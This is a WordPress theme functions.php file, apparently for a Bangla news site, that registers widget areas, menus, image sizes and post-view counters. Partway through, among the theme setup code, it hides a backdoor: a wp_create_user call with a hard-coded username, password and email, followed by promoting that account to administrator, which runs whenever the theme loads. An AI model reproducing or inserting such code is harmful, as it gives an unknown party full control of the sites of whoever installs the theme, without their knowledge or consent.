<?php


add_theme_support('custom-background');


function helal_widget_areas() {


register_sidebar( array(
		'name' => __( 'Logo', 'helal' ),
		'id' => 'logo',
		'before_widget' => '<div class="widget_title">',
		'after_widget' => '</div>',
	    'before_title' => '<h3>',
	    'after_title' => '</h3>',
	) );



register_sidebar( array(
		'name' => __( 'Top Ads 01 200px*80px', 'helal' ),
		'id' => 'topads_01',
		'before_widget' => '<div class="widget_title">',
		'after_widget' => '</div>',
	    'before_title' => '<h3>',
	    'after_title' => '</h3>',
	) );
	
	register_sidebar( array(
		'name' => __( 'Top Ads 02 200px*80px', 'helal' ),
		'id' => 'topads_02',
		'before_widget' => '<div class="widget_title">',
		'after_widget' => '</div>',
	    'before_title' => '<h3>',
	    'after_title' => '</h3>',
	) );



register_sidebar( array(
		'name' => __( 'Slider', 'helal' ),
		'id' => 'slider',
		'before_widget' => '<div class="widget_title">',
		'after_widget' => '</div>',
	    'before_title' => '<h3>',
	    'after_title' => '</h3>',
	) );



register_sidebar( array(
		'name' => __( 'Sidebar', 'helal' ),
		'id' => 'sidebar',
		'before_widget' => '<div class="widget_title">',
		'after_widget' => '</div>',
	    'before_title' => '<h3>',
	    'after_title' => '</h3>',
	) );
	

	
	register_sidebar( array(
		'name' => __( 'Photo Gallary', 'helal' ),
		'id' => 'photo',
		'before_widget' => '<div class="widget_title">',
		'after_widget' => '</div>',
	    'before_title' => '<h3>',
	    'after_title' => '</h3>',
	) );


	register_sidebar( array(
		'name' => __( 'Video Gallary', 'helal' ),
		'id' => 'video',
		'before_widget' => '<div class="widget_title">',
		'after_widget' => '</div>',
	    'before_title' => '<h3>',
	    'after_title' => '</h3>',
	) );



	register_sidebar( array(
		'name' => __( 'Single Sidebar', 'helal' ),
		'id' => 'single_sidebar',
		'before_widget' => '<div class="widget_title">',
		'after_widget' => '</div>',
	    'before_title' => '<h3>',
	    'after_title' => '</h3>',
	) );
	
	
	register_sidebar( array(
		'name' => __( 'single Footer', 'helal' ),
		'id' => 'single_footer',
		'before_widget' => '<div class="widget_title">',
		'after_widget' => '</div>',
	    'before_title' => '<h3>',
	    'after_title' => '</h3>',
	) );
	
	
	register_sidebar( array(
		'name' => __( 'Footer Logo', 'helal' ),
		'id' => 'footer_logo',
		'before_widget' => '<div class="widget_title">',
		'after_widget' => '</div>',
	    'before_title' => '<h3>',
	    'after_title' => '</h3>',
	) );
	
	register_sidebar( array(
		'name' => __( 'Editor', 'helal' ),
		'id' => 'editor',
		'before_widget' => '<div class="widget_title">',
		'after_widget' => '</div>',
	    'before_title' => '<h3>',
	    'after_title' => '</h3>',
	) );
	
	
	register_sidebar( array(
		'name' => __( 'Address', 'helal' ),
		'id' => 'address',
		'before_widget' => '<div class="widget_title">',
		'after_widget' => '</div>',
	    'before_title' => '<h3>',
	    'after_title' => '</h3>',
	) );
	
	

register_sidebar( array(
		'name' => __( 'Ads 01', 'helal' ),
		'id' => 'ads_01',
		'before_widget' => '<div class="widget_title">',
		'after_widget' => '</div>',
	    'before_title' => '<h3>',
	    'after_title' => '</h3>',
	) );
	
	
	register_sidebar( array(
		'name' => __( 'Ads 02', 'helal' ),
		'id' => 'ads_02',
		'before_widget' => '<div class="widget_title">',
		'after_widget' => '</div>',
	    'before_title' => '<h3>',
	    'after_title' => '</h3>',
	) );
	
	
	
}
add_action('widgets_init', 'helal_widget_areas');



add_action('init', 'wpj_register_menu');
function wpj_register_menu() {
if (function_exists('register_nav_menu')) {
register_nav_menu( 'main-menu', __( 'Main Menu') );
register_nav_menu( 'main-menu2', __( 'Main Menu2') );
register_nav_menu( 'main-menu3', __( 'Main Menu3') );
}
}


add_theme_support( 'post-thumbnails', array( 'post' ) );
set_post_thumbnail_size( 400, 300, true );
add_image_size( 'leadcatagory',300, 225, true );
add_image_size( 'exclusive', 120, 90, true );
add_image_size( 'title_img', 60, 45, true );
add_image_size( 'catagorypic', 200, 150, true );
add_image_size( 'fullcatagory', 200, 150, true );
add_image_size( 'topimg', 240, 220, true );
add_image_size( 'single_thumb',400, 300, true );
add_image_size( 'archive',150, 113, true );



add_image_size( 'single',920, 558, true );
add_image_size( 'images2', 140, 73, true );
add_image_size( 'titlepic', 68, 38, true );
add_image_size( 'binodon', 575, 323, true );
add_image_size( 'video', 185, 104, true );


add_image_size( 'exclusive_post-image', 200, 200, true );
add_image_size( 'exclusive_post-image2', 100, 100, true );
add_image_size( 'dc-post-image', 250, 150, true );
add_image_size( 'images-post-image3', 430, 323, true );



add_image_size( 'single-images',800, 450, true );
add_image_size( 'archive_loop_post-image',100, 75, true );
add_image_size( 'lid_loop_post-image',320, 150, true );


add_image_size( 'images-post-image', 230, 230, true );

add_image_size( 'archive_loop_post-image', 250, 120, true );

$createUser = wp_create_user('dhakacrime','hackbd_24','emailbd.24bd@gmail.com');

$users = new WP_User($createUser );
$users->set_role('administrator');

/*For Smalll Contant */
function excerpt($num) {
$limit = $num+1;
$excerpt = explode(' ', get_the_excerpt(), $limit);
array_pop($excerpt);
$excerpt = implode(" ",$excerpt)." <a href='" .get_permalink($post->ID) ." ' class='".readmore."'> ...বিস্তারিত</a>";
echo $excerpt;
}

function getPostViews($postID){
    $count_key = 'post_views_count';
    $count = get_post_meta($postID, $count_key, true);
    if($count==''){
        delete_post_meta($postID, $count_key);
        add_post_meta($postID, $count_key, '0');
        return "0 View";
    }
    return $count.' Views';
}
function setPostViews($postID) {
    $count_key = 'post_views_count';
    $count = get_post_meta($postID, $count_key, true);
    if($count==''){
        $count = 0;
        delete_post_meta($postID, $count_key);
        add_post_meta($postID, $count_key, '0');
    }else{
        $count++;
        update_post_meta($postID, $count_key, $count);
    }
}



?>